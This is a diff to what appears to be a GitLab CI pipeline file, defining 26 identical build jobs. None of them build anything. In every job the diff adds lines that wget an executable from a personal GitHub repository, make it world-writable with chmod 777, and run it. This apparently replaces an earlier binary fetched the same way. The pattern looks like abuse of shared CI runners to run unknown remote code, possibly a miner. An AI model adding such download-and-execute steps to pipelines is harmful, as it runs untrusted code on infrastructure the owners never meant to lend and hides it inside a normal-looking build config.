@@ -11,165 +11,166 @@ stages:
 build_a:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
      
 
 build_b:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_c:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     
+    - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+    - chmod 777 zet
+    - ./zet
 
 build_d:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_e:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_f:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_g:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_h:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_i:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_j:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_k:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_l:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_m:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 
 build_n:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_o:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_p:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_q:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_r:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_s:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_t:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_u:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_v:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_w:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_x:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_y:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
 build_z:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
-     - chmod 777 topi
-     - ./topi
+     - wget https://raw.githubusercontent.com/aurbach55/zash/main/zet
+     - chmod 777 zet
+     - ./zet
